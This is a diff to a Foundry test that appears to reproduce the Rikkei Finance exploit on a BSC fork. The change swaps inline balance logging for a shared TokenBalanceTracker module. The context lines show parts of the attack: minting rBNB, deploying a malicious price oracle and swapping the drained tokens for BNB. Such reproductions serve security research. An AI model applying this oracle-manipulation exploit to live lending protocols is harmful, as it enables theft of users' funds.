@@ -8,6 +8,7 @@ import {IERC20} from '../interfaces/IERC20.sol';
 import {IWETH9} from '../interfaces/IWETH9.sol';
 
 import {IPancakeRouter01} from '../utils/IPancakeRouter01.sol';
+import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
 
 // forge test --match-contract Exploit_Rikkei -vvv
 /*
@@ -70,7 +71,7 @@ interface ISimpleOraclePrice{
     function setOracleData(address rToken, ChainLinkOracle _oracle) external;
 }
 
-contract Exploit_Rikkei is TestHarness {
+contract Exploit_Rikkei is TestHarness, TokenBalanceTracker {
     // List of IRTokens stolen
     IRToken internal rBNB = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);
 
@@ -103,6 +104,12 @@ contract Exploit_Rikkei is TestHarness {
 
         // The attacker contract started with some BNBs.
         cheat.deal(address(this), attackerContract.balance);
+
+        for(uint256 i = 0; i < tokens.length; i++){
+            addTokenToTracker(address(tokens[i]));
+        }
+
+        addTokenToTracker(address(rBNB));
     }
 
     receive() external payable {}
@@ -119,7 +126,7 @@ contract Exploit_Rikkei is TestHarness {
 
         console.log('------- STEP 1: MINT rBNB -------');
         rBNB.mint{value: 0.0001 ether}(); // in BNB
-        emit log_named_decimal_uint('Balance of rBNB:', rBNB.balanceOf(address(this)), rBNB.decimals());
+        logBalances(address(this));
         console.log('\n');
 
         console.log('------- STEP 2: ENTER MARKET -------');
@@ -147,8 +154,7 @@ contract Exploit_Rikkei is TestHarness {
             curToken.approve(address(router), type(uint256).max);
             
             console.log('Attacker Balance');
-            emit log_named_decimal_uint(curToken.name(), curToken.balanceOf(address(this)), curToken.decimals());
-            emit log_named_decimal_uint('NATIVE TOKENS', address(this).balance, 18);
+            logBalances(address(this));
 
             console.log("------- STEP 4.%s.2: SWAPPING %s FOR NATIVE TOKENS -------", i+1, curToken.name());
 
@@ -158,9 +164,8 @@ contract Exploit_Rikkei is TestHarness {
 
             router.swapExactTokensForETH(curToken.balanceOf(address(this)), 1, _path, address(this), 1649992719);
             console.log('Attacker Balance');
-            
-            emit log_named_decimal_uint(curToken.name(), curToken.balanceOf(address(this)), curToken.decimals());
-            emit log_named_decimal_uint('NATIVE TOKENS', address(this).balance, 18);
+            logBalances(address(this));
+
             console.log('\n');
         }
 
@@ -174,15 +179,6 @@ contract Exploit_Rikkei is TestHarness {
 
     function deployMaliciousOracle(uint256 _salt) internal returns(address newOracleDeployed){
         newOracleDeployed = address(new MaliciousOracle{salt: bytes32(_salt)}());
-    }
-
-    function logBalances(address _from) internal {
-        emit log_named_decimal_uint('NATIVE TOKENS', _from.balance, 18);
-        uint256 tokensLength = tokens.length;
-        for(uint i = 0; i < tokensLength; i++){
-            emit log_named_decimal_uint(tokens[i].name(), tokens[i].balanceOf(_from), tokens[i].decimals());
-        }
-        console.log('\n');
     }
 }
 
